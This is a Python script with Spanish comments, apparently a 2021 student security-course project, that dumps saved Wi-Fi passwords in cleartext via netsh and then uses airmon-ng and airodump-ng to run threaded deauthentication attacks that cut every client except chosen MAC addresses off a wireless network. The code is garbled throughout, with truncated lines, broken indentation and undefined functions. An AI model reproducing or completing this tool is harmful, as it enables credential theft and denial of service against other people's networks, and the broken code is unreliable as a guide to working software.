import errno
#Es una clase de error para el sistema operativo del módulo "OS", cuando la función específica mandada devuelve un error relacionada con el sistema o con el equipo.
import glob
#Nos ayuda para poder encontrar las extensiones que se asimilen a un determinado archivo, pero ahroa tomaremos cada archivo y los almacenaremos en la carpeta "passwordWif"
import shutil
#Me realiza respaldos para posterior ser enviados a una lista en .csv
import csv
#Se podra almacenar en archivos csv para tener registros de cada prueba
from datetime import datetime, time
#Tener un respaldo de la hora que se modifico y realizo con fechas y hora. La cual se maneja de algo priomordial
import os,re
#Se podra obtener un detallado de cada red que se buscara y poder detallarlo en cada prueba
#<<<<<<----SE LOGRAN COMBINAR----->>>>>>
#Lo importante de las expresiones podremos cambiar cada dato y modificarlo en cada conexion, de tal manera poder manejar un cambio 
#para cada configuracion en un almacenamiento.
import subprocess
#Se podra crear subprocesos de tal manera que mientras se ejecuta el ataque poder mantener la conecion de denegacion a otros usuarios.

#Se creara un repositorio para almacenar las contraseñas que cuando se denege a cada usuario se almacene cada una
try:
    os.mkdir('./passwordWifi')
except OSError as error: #De tal manera con el comando OSError podemos verificar si reconoce cada clave y sino vuelve a buscar entre sus archivos.
    if error.errno != errno.EEXIST: #Verifica si hubo un error para poder continuar o seguir buscando
        raise
#<<<<<<<<<---FASE UNO-------->>>>>>>

#Esta fase sera de bloqueo simple para comprobar la seguirdad, luego obtener cada red hace una busqueda sencilla, de tal manera que si consigue pueda obtener datos con una seguridad simple.
show = subprocess.check_output(['netsh', 'wlan', 'show', 'profile'])
    print show
networks = subprocess.check_output(['netsh', 'wlan', 'show', 'networks'])
    print networks
#Luego si encuentra se almacena en el archivo csv
    password = subprocess.check_output(['netsh', 'wlan', 'export', 'profile','key=clear']).decode('utf-8').split('\n')
#Al obtener el archivo lo mueve a la carpeta que se creo como la nueva variable files
filess = glob.iglob(os.path.join("./", "*.csv"))

#<<<<<<<<<---FASE DOS-------->>>>>>>

#Si no se logro entrar con busqueda en sus comandos, continua en la fase de reconocimiento y usando el bloqueador de AIRMON-NG para entrar a cada red eliminado su red.


#Inicializamos en comandos con verificacion de en interfaz de Kali Linux
#Previo a esto tenemos que comprobar con un monitor en conector Wifi para empezar a ser como un adpatador de red al ingresar
def in_su(): #Definimos nombre de ingreso la cual se autentica en modo root para ingresar
    if not 'IP_ROOT' in os.environ.keys():
        print("Intente ejecutar en modo privilegio")
        exit()

#Luego consultamos si ya capturamos anteriormente para no volver
def verificar_ESSID(essid, lst, item):
    #Si tenemos nos muestra la lista, de tal manera afirmamos con un resultado true
    check_status = True
    #Consulta si en nuestro repositorio ya se encuentra algun archivo returna y sale del programa
    try:
        if len(lst) == 0:
            if essid in item ["ESSID"]:
                return check_status

    except KeyboardInterrupt:
        print("\nFin de programa--2")#Al finalizar

#Verificamos si se se encontro ADW(Adaptadores de Wifi), para continuar
def encontrar_ADW():
    resultado = subprocess.run(["ip", "dev"], 
        capture_output=True).stdout.decode()
        adw = wlan_code.findall(resultado)
        return adw

#Se almacenara los comandos predeterminado de Kali Linux para luego ejecutar en orden
#Ejecutamos el tipo de monitor habil
def set_prueba_raiz(controller_nombre):
    subprocess.run(["ip", "link", "set", wifi_nombre, "up"]) #Verificamos si la interfaz continue los datos visibles
    subprocess.run(["airmon-ng", "check", "kill"])             #Luego eliminamos cualquier seguridad para acabar con su proteccion
    subprocess.run(["iw", wif_nombre, "set", "monitor", "none"])#
    subprocess.run(["ip", "link", "set", wifi_nombre, "up"])

def set_control_raiz(choice):
    if choice == "0":"1", "--output-format", "csv", wifi_nombre], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)#verificamos la banda de conexion la cual se enbcutra para interferir
        elif choice == "1": #es para ñla banda 2,4hgz
            subprocess.Popen(["airodump-ng", "--band", "a", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_nombre], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)        
        else: #Y sino empieza con el 1, puede elegir la opcion 2
            subprocess.Popen(["airodump-ng", "--band", "abg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_nombre], stdout=subprocess.DEVNULL, 

#Crear los respaldos en CSV para obtener el registro ya que no vamos a unas redes si no a varias que puedan esta conectadas.
def respaldo_csv(): 
        if ".csv" in archivo_csv:
            print("No tendria que tener archivos cvs, pero se ve otros")
            directory = os.getcwd()
            try:
                os.mkdir(directory + "/respaldo/")except:
                print("Tiene carpeta habil")
	output=0;
            timestamp = datetime.now()
            shutil.move(archivo_csv, directory + "/backup/" + str(timestamp) + "-" + archivo_csv)

#Restaura todo al finalizar 
def restaurador(wifi_nombre):
    subprocess.run(["ip", "link", "set", wifi_nombre, "down"]) # apaga el adpatador 
    subprocess.run(["iwconfig", wifi_nombre, "mode", "managed"])# lo convierte en en modo manager y no una red de wifi falsa
    subprocess.run(["ip", "link", "set", wifi_nombre, "up"]) #Procede a continuar con la red que infiltro
    subprocess.run(["service", "NetworkManager", "start"]) # Continua con la conexion en Conexion Reiniciada

#Volvemos a verificar si ya capturo de tal manera, que ya tenga en mira una red podra finalizarlo
def verificar_essid(essid, lst):
    check_status = True

    return check_status

print("\n****************************************************************")
print("\n*     Estudiante: Limberth Hugh - Ingeneiria de Sistemas       *")
print("\n*      FASE 1: Obtencion de contraseñas de equipo propio       *")
print("\n*      FASE 2: Bloqueo de wifi a otros usuarios                *")
print("\n*                            2021                              *")
print("\n*                   SEGURIDAD INFORMATICA                      *")
print("\n****************************************************************")

#Verifica si esta en modo root para continuar
in_su()
#Realiza un respaldo previo datos obtenidos
backup_csv()
#Inicializamos  en buscar por la captura de datos y previo escogido la red que denegaremos
while True:
    print("Ingrese la direccion MAC que no desea que se toque")
    macs = input("Ingrese un separador por coma para su lista, 1c:48:a4:58:12:c4 =>")
    macs_not_to_kick_off = mac_address_regex.findall(macs) #Listamos las direciones que tendran acceso
    macs_not_to_kick_off = [mac.upper() for mac in macs_not_to_kick_off] #Tomaremos configuracion si es habil la direcion mac
    if len(macs _off) > 0: # si no hay erro continua
        break
    
    print("No es una direccion valida")

#Consultamos el tipo de banda la cual trabaj la red que esta dentro 
while True:
    wifi_controller_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (Prueba ambas)"]
    print("Que tipo de banda que esta usando")
    for index, controller in enumerate(wifi_controller_bands): #Verificamos el tipo de conexion y habilitarlo previo configuracion (arriba)
        print(f"{index} - {controller}")
    
#Elegimos la banda que sera usada para el bloqeuo
    band_choice = input("Ingrese el tipo de banda que usa: ")
    try:
        if wifi_controller_bands[int(band_choice)]:
            band_choice = int(band_choice) #previo esto reconcera el monitor para cual red trabaj especificamente, la cual si es difernete no habra una comunicaion mutua entre si
            break
    except:
        print("No es una seleccion valida")

#Consultamos el tipo de interfaz ubicando el tipo de ADAPTADOR que se marco como MODO MONITOR
conector_wifi = set_prueba_raiz()
if len(conector_wifi) == 0: #Si no hay uno conectado, consultara para procesguir
    print("Conecte un contralador en la inerfaz de la red")
    exit()
# Al tener habilitado consulta la conexion que mantiene elegiendo si tenemos mas de dos
while True:
    for index, controller in enumerate(conector_wifi):
        print(f"{index} - {controller}")
    
    controller_choice = input("Seleccione un adaptador para el bloqueo: ")

    try:
        if conector_wifi[int(controller_choice)]: #Consulta si dicho controlador coinicde para activarse como MODO: MONITOR
            break
    except:
        print("No es un adaptador compatible")
#Si hay compatibilidad empieza a ser como un usuario mas y el adaptador empieza a conectarse
wifi_nombre = conector_wifi[int(controller_choice)]

#<<<<<<<<<--------FASE 2 : FINAL---------->>>>>>>>>>>
#Al tener configurado procede a listar cada red y mantener es busqueda con cada configuracion de banda y tipo de seguridad desbloqueada
usuarios_finales= set()
#Almacenamos cada busqueda sin perder la lista de cada uno
threads_started = []
# Mantenemos el codigo de AIRMON-NG habil para impedir interrupciones
subprocess.run(["airmon-ng", "start", wifi_nombre, hackchannel])

#Prodecemos a tomar dos opciones la cual toma el proceso o elimina
try:
    #luego de continuat procedemos con el bucle de deteccion e impedimento de usuarios que se conecten
    while True
        subprocess.call("cls", shell=True) # Cada vez que se liste empieze a limpiar cada usuario

        #Luego de tener acceso empezamos a almacenar los datos
             if ".csv" in lista_red and file_name.startswith("clients"):
                    with open(lista_red) as csv_h:
                    print("Corriendo") # Al empezar a correr empieza a grabar
                    csv_h.seek(0) #empezando en datos seek(0) 
                    csv_reader = csv.DictReader(csv_h, fieldnames=lista_red) # Lo direcciona a la carpeta ya creada

         #Al tener habilitado empezamos a mostrar y ejecutar el bloqueo por medio de las lista de inactivos que grabo 
         # Si el sistema detecto entre 10 usuario de una red y colocamos 1 direccion mac, para que tenga internet
         # Nos mostrara y activara la denegacion de los demas 9           
         usuarios_finales.add(row["Direcciones mac en Espera"])
    print("DIRECCIONES (MAC) espera...   |")
    print("______________________________|")
        for item in usuarios_finales:
            if item not in cadena_bloqueo:
                    # Empieza a crear un ciclo que impide el acceso por la banda que trabaja de conexion a internet
                    cadena_bloqueo.append(item)
                    # Lo que toma el deauth atack impide con el airmon-ng inhabilitando la direccion mac, menteniendo en bluque
                    # tomando con el nombre ssid extraido como estacion y el nombre correspondiente
                    # Y el deamon trabaja el ataque en linea sin perder conecion en segundo plano
                    t = threading.Thread(target=deauth_attack, args=[hackbssid, item, wifi_nombre], daemon=True)
                    #Procede el funcioanmiento hasta que el atacante lo termine
                    t.start()
                    # la cual el comando que interfiere es CTRL+C para acabar el proceso
except KeyboardInterrupt:
    print("\nBloqueo se termino")

#con esto lo dejamos como al principio y continua su funcionalidad
restuarador(wifi_nombre)
#Eso seria en bloqueo de wifi por medio de comadnos linux y tomados como codigo python